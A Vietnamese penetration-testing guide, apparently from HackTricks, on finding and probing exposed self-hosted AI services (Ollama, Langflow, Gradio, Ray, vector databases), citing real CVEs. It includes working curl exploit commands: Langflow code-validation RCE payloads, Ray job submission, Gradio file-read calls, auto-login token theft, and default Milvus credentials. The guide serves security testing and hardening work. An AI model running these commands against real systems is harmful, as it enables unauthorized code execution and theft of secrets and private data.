# Các dịch vụ AI tự host bị lộ

{{#include ../banners/hacktricks-training.md}}

Các nhóm xây dựng tính năng AI thường tự chạy model runner, agent builder, giao diện demo, cụm compute và vector database. Nhiều công cụ trong số này được thiết kế để dùng trên laptop hoặc trong mạng lab khép kín, vì vậy **mặc định không có xác thực** hoặc được bật sẵn một lối tắt xác thực. Khi kẻ tấn công có thể truy cập một dịch vụ như vậy, tác động thường thuộc một trong các nhóm sau:

- Dùng GPU và model miễn phí, đánh cắp model riêng tư.
- Rò rỉ prompt, tài liệu và embedding.
- Rò rỉ secret từ môi trường của process (khóa của nhà cung cấp LLM, thông tin xác thực cloud).
- Thực thi code, vì một số API này chạy code **như một tính năng**.

Trang này mô tả cách tìm các dịch vụ này và những gì cần kiểm tra trên từng loại API. Để harden inference server tự host và lỗi leak của llama.cpp `/slots`, xem [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening). Để biết về các file model độc hại, xem [AI Models RCE](AI-Models-RCE.md).

## Nhận diện dấu vân tay

Gửi các request này mà không có thông tin xác thực. Phản hồi JSON có các trường như dự kiến sẽ nhận diện được sản phẩm, và thường cả phiên bản, cho biết những kiểm tra nào bên dưới cần áp dụng. Các port là giá trị mặc định được tài liệu ghi lại hoặc port dùng trong các ví dụ chạy chính thức.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| Sản phẩm | Port phổ biến | Request không cần xác thực | Dấu hiệu nhận diện |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | JSON phiên bản, danh sách model cục bộ |
| Langflow | 7860 | `GET /api/v1/version` | JSON phiên bản Langflow |
| Gradio | 7860 | `GET /config` | Cấu hình app có phiên bản Gradio và ID component |
| Ray dashboard | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, danh sách job đã gửi |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Giá trị heartbeat, phiên bản Chroma |
| Qdrant | 6333 | `GET /`, `GET /collections` | Phiên bản Qdrant, danh sách collection |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Phiên bản Weaviate, các class |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Danh sách collection hoặc lỗi xác thực |

Các dịch vụ này cũng thường được publish phía sau reverse proxy với một tiền tố đường dẫn (ví dụ `/ollama/` hoặc `/ray/`), vì vậy hãy gửi lại các request dưới bất kỳ tiền tố nào tìm thấy trong bundle JavaScript hoặc tài liệu API.

## API inference và quản lý model không cần xác thực

Model runner thường cung cấp một REST API duy nhất, kết hợp các route inference với các route quản trị. Ollama là một ví dụ điển hình. Công cụ này không tích hợp xác thực và mặc định bind vào `127.0.0.1:11434`, trong khi `OLLAMA_HOST` thay đổi địa chỉ bind.<sup>[[1]](#references)[[15]](#references)</sup> Docker image chính thức đặt `OLLAMA_HOST=0.0.0.0:11434` bên trong container, khai báo `EXPOSE 11434` và không có chỉ thị `USER`, nên server chạy với quyền root trong container.<sup>[[16]](#references)</sup> `EXPOSE` không publish port ra host, vì vậy khả năng truy cập từ host tùy thuộc vào cách triển khai. Các lệnh `docker run` được tài liệu hướng dẫn dùng `-p 11434:11434`, và Docker publish ánh xạ như vậy trên tất cả interface của host trừ khi chỉ định IP host.<sup>[[17]](#references)[[18]](#references)</sup>

Các nhóm route mang lại cho kẻ tấn công những gì:<sup>[[2]](#references)</sup>

| Routes | Tác động khi không cần xác thực |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | Danh sách model cục bộ và đang được tải, bao gồm cả model tùy chỉnh riêng tư |
| `POST /api/show` | Chi tiết model, bao gồm Modelfile, template và **system prompt** |
| `POST /api/generate`, `/api/chat`, `/api/embed` | Inference miễn phí trên phần cứng của nạn nhân |
| `POST /api/pull`, `/api/push` | Khiến server tải model từ hoặc tải model lên một registry do kẻ tấn công chọn |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | Tạo, ghi đè hoặc xóa model |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

Danh sách model được trả về mà không cần thông tin xác thực đã đủ chứng minh dịch vụ bị lộ. Model tùy chỉnh thường chứa system prompt nội bộ trong `/api/show`. Pull về máy chủ của bạn chứng minh máy chủ tải manifest từ registry do kẻ tấn công chọn. `/api/push` đến registry của bạn biến việc lộ dịch vụ thành hành vi đánh cắp model. Không gọi các route tạo hoặc xóa trên mục tiêu thực.

Các thao tác pull từ registry cũng là bề mặt tấn công parser, vì máy chủ lưu blob bằng các giá trị lấy từ manifest từ xa. Trong Probllama (CVE-2024-37032, đã được vá trong Ollama 0.1.34), `digest` trong manifest được dùng làm tên tệp mà không qua xác thực. Do đó, registry độc hại có thể ghi tệp bên ngoài thư mục blobs bằng các chuỗi `../`. Đẩy một manifest được cài cắm, có digest trỏ đến tệp cục bộ, sẽ làm lộ tệp đó cho registry của kẻ tấn công. Wiz đạt được RCE trong Docker, nơi máy chủ chạy với quyền root, bằng cách ghi một thư viện dùng chung và thêm nó vào `/etc/ld.so.preload`, sau đó gọi `/api/chat` để một tiến trình mới tải thư viện đó.<sup>[[15]](#references)</sup> Khi runner có thể pull từ các registry bất kỳ, hãy kiểm tra cách nó chuyển các trường trong manifest thành đường dẫn.

## API được thiết kế để thực thi code

Liên quan: [Ghi đè workflow-code theo từng request trong Flowise](../pentesting-web/server-side-javascript-injection.md#per-request-workflow-code-overrides-flowise).

### API gửi job

Các framework tính toán phân tán xem việc thực thi code là chức năng chính. Ray Jobs API trên cổng dashboard (8265) chấp nhận lệnh shell `entrypoint` và chạy lệnh đó trên cluster.<sup>[[19]](#references)</sup> Nghiên cứu ShadowRay của Oligo cho biết Jobs API không có xác thực và dashboard bind tới `0.0.0.0`. CVE-2023-48022 tương ứng đang gây tranh cãi vì Ray được kỳ vọng chỉ chạy trong một mạng được kiểm soát.<sup>[[20]](#references)</sup> Ray bổ sung xác thực token tùy chọn (`RAY_AUTH_MODE=token`) trong phiên bản 2.52.0. Ray 2.59 bật tính năng này theo mặc định cho các cluster cục bộ được khởi chạy bằng `ray.init()`; `ray start --head` vẫn có thể khởi chạy mà không cần xác thực nếu không có token khả dụng. Ray mô tả kế hoạch triển khai xác thực mặc định rộng hơn trong phiên bản 2.61, vì vậy hãy kiểm tra phiên bản và cách khởi chạy đã triển khai thay vì mặc định cho rằng dashboard đang mở.<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

Các dashboard kiểu này cũng có những route phụ đáng để kiểm tra trên các phiên bản cũ. Trước Ray 2.8.1, `/log_proxy?url=` có thể fetch bất kỳ URL HTTP(S) nào (SSRF tới cloud metadata), còn `/api/v0/logs/file` chấp nhận đường dẫn `filename` tùy ý; cả hai đều không yêu cầu xác thực.<sup>[[8]](#references)</sup>

### Các endpoint "xác thực" code thực thi định nghĩa hàm

Các công cụ xây dựng agent chấp nhận component Python tùy chỉnh đôi khi "xác thực" code bằng cách phân tích nó với `ast` rồi chỉ chạy các định nghĩa hàm bằng `exec()`. Cách này không an toàn. Python đánh giá **decorator và giá trị đối số mặc định khi định nghĩa hàm**, nên code đặt ở đó vẫn chạy ngay cả khi phần thân hàm không bao giờ được thực thi. `POST /api/v1/validate/code` của Langflow hoạt động theo cách này và không yêu cầu xác thực trước phiên bản 1.3.0 (CVE-2025-3248). Ném ra một exception chứa đầu ra của command sẽ khiến endpoint trả đầu ra đó trong response:<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

Kiểm tra mọi endpoint biên dịch, lint hoặc “kiểm tra” mã người dùng để tìm mẫu này, và ưu tiên dùng DNS callback làm bằng chứng.

### Các route tự động đăng nhập và token superuser mặc định

Các công cụ dành cho một người dùng thường có sẵn lối tắt tự động đăng nhập mọi khách truy cập với quyền quản trị viên. Trong Langflow, khi `AUTO_LOGIN` được bật, `GET /api/v1/auto_login` trả về token của superuser mặc định cho bất kỳ người gọi nào. Khi bị tắt, route trả lời `Auto login is disabled.`.<sup>[[23]](#references)</sup> Langflow OSS 1.0.0 đến 1.10.0 bật tính năng này theo mặc định (CVE-2026-9103). Kết hợp nó với route xác thực mã yêu cầu xác thực ở trên sẽ khôi phục RCE không cần xác thực (CVE-2026-9198, do Harish Kolla báo cáo).<sup>[[24]](#references)[[25]](#references)[[33]](#references)</sup> Các gói phát hành và Docker image chính thức hiện tại đã tắt đăng nhập tự động và yêu cầu mật khẩu superuser, nhưng các nhánh phát triển vẫn bật tính năng này.<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

Ngay cả khi không có khả năng thực thi code, token superuser vẫn cho phép truy cập mọi flow và thông tin xác thực của provider được lưu trữ. Để xem bước kiểm tra điều kiện tiên quyết liên quan trong kiểm thử tự động, hãy xem [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md).

## Các route phục vụ file và RPC trong giao diện demo ML

Các framework demo ML phục vụ file đã tải lên và được tạo thông qua một route chung, đồng thời cho phép frontend gọi các helper của component phía server. Gradio cung cấp `/config`, `/upload` và `/file=<path>` cho việc này.<sup>[[5]](#references)</sup> Có hai kiểu cần kiểm tra trên mọi framework tương tự:

- **Traversal từ thư mục con upload:** nếu route file chỉ kiểm tra rằng đường dẫn bắt đầu bên trong thư mục temp, hãy tải lên một file để tạo thư mục con, rồi thoát khỏi thư mục đó bằng `../` hoặc `%2e%2e%2f`. Gradio phiên bản 4.0 đến 4.10 (CVE-2023-51449) bị lỗ hổng theo cách này.<sup>[[26]](#references)[[27]](#references)</sup> Gửi request bằng `curl --path-as-is` để client không chuẩn hóa đường dẫn.
- **Gọi phương thức tùy ý:** endpoint gọi `getattr(component, fn_name)` với dữ liệu đầu vào của người dùng cho phép attacker gọi các helper nội bộ. Trước phiên bản 4.13.0, `/component_server` của Gradio hoạt động như vậy. Trong phiên bản 4.3 đến 4.12, `move_resource_to_block_cache` sao chép mọi file cục bộ vào cache, nơi có thể tải file xuống qua `/file=`. Trong phiên bản 3.47 đến 3.50.2, các helper khác cho phép đọc file và thực hiện SSRF đọc toàn bộ nội dung.<sup>[[26]](#references)[[28]](#references)</sup> Server đã được vá sẽ trả lời `Function not found.` với các helper không được đánh dấu là hàm server.<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

Trên Hugging Face Spaces, các secret của Space là biến môi trường, vì vậy `/proc/self/environ` là tệp có giá trị nhất. Horizon3 đã đọc tệp này bằng header HTTP `Range`.<sup>[[26]](#references)</sup>

## Cơ sở dữ liệu vector được RAG sử dụng

RAG lưu các đoạn trích từ tài liệu gốc, embedding và metadata của chúng trong cơ sở dữ liệu vector, rồi trợ lý đưa các kết quả hàng đầu vào prompt. Do đó, quyền đọc làm lộ **văn bản thuần của tài liệu riêng tư**. Quyền ghi cho phép kẻ tấn công chèn các đoạn trích được truy xuất vào prompt của người dùng khác về sau, đây là prompt injection gián tiếp có tính dai dẳng (xem [AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)).

Đối với cơ sở dữ liệu vector tự lưu trữ, hãy kiểm tra xem xác thực đã được cấu hình hay quyền truy cập ẩn danh có được bật hay không:

- **Qdrant**: các instance tự triển khai lắng nghe trên mọi interface mà không cần xác thực. Khi được cấu hình, key được đặt trong header `api-key` hoặc dưới dạng `Authorization: Bearer`. Có thể tồn tại key chỉ đọc và key giới hạn theo collection.<sup>[[11]](#references)</sup>
- **Chroma**: xác thực bị tắt theo mặc định. Xác thực bằng token sử dụng `Authorization` hoặc `X-Chroma-Token`.<sup>[[29]](#references)</sup>
- **Weaviate**: khi bật quyền truy cập ẩn danh, các request không có thông tin xác thực được xác thực là `user: anonymous` và nhận mọi quyền mà người dùng đó có.<sup>[[30]](#references)</sup>
- **Milvus**: xác thực bị tắt trừ khi `common.security.authorizationEnabled` là `true`. Khi được bật, người dùng `root` mặc định có mật khẩu `Milvus` và định dạng token là `username:password`.<sup>[[31]](#references)[[14]](#references)</sup>

Phản hồi chứa dữ liệu riêng tư khi không có thông tin xác thực cho thấy dữ liệu đang bị lộ. Khi xác thực được bật, hãy đánh giá riêng mọi tài khoản mặc định chưa được đổi:<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

Kiểm tra xem payloads có chứa văn bản tài liệu, mã định danh người dùng hoặc tên tenant hay không. Để chứng minh quyền ghi mà không làm nhiễm bẩn dữ liệu production, hãy tạo rồi xóa ngay một collection rỗng có tên rõ ràng, và chỉ thực hiện khi phạm vi cho phép.

Trên các server này, quá trình xác thực cũng có thể diễn ra quá muộn. Trong server Python FastAPI của Chroma (từ phiên bản 1.0.0 đến ít nhất 1.5.8, CVE-2026-45829), route tạo collection đã khởi tạo hàm embedding do client cung cấp trước khi kiểm tra xác thực. Một cấu hình tham chiếu đến model Hugging Face do attacker kiểm soát với `trust_remote_code: true` đã chạy code của attacker ngay cả khi request bị từ chối. Rust frontend không bị ảnh hưởng.<sup>[[32]](#references)</sup> Khi request mang theo cấu hình model hoặc plugin, hãy kiểm tra request không có thông tin xác thực và theo dõi xem có yêu cầu fetch ra ngoài đến repository model của bạn hay không.

## References

- [1] [Câu hỏi thường gặp về Ollama](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Tài liệu API Ollama](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [README của Langflow](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Mã nguồn Langflow - các endpoint API v1](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Mã nguồn Gradio - routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Mã nguồn Gradio - http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Mã nguồn Ray - job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox - Ray, các phiên bản 2.6.3, 2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Mã nguồn Chroma - giá trị mặc định của Python client](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Mã nguồn Chroma - các route của FastAPI server](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant - Bảo mật](https://qdrant.tech/documentation/security/)
- [12] [Đặc tả OpenAPI của Qdrant](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Đặc tả OpenAPI của Weaviate](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus - Kết nối với Milvus Server](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz - Probllama: Lỗ hổng thực thi mã từ xa của Ollama (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Dockerfile của Ollama](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Tài liệu Docker của Ollama](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker - Xuất bản và mở các port](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [REST API của Ray Jobs](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo - ShadowRay: Chiến dịch tấn công đầu tiên được biết đến nhắm vào workload AI, bị khai thác ngoài thực tế](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Xác thực bằng token của Ray](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai - Không an toàn ở bất kỳ tốc độ nào: Lạm dụng Python Exec để thực thi mã từ xa trái phép trong Langflow AI](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Mã nguồn Langflow - bộ định tuyến đăng nhập](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD - CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD - CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai - Khai thác lỗ hổng đọc file trong Gradio để đánh cắp secrets từ Hugging Face Spaces](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Thông báo bảo mật Gradio GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Commit sửa lỗi của Gradio cho `/component_server`](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook - Xác thực gốc của Chroma](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate - Xác thực](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus - Xác thực quyền truy cập của người dùng](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer - ChromaToast được phục vụ trước xác thực](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
- [33] [Bản tin bảo mật IBM - Thực thi mã từ xa không cần xác thực thông qua bỏ qua Auto-Login và xác thực mã (CVE-2026-9198)](https://www.ibm.com/support/pages/node/7278927)
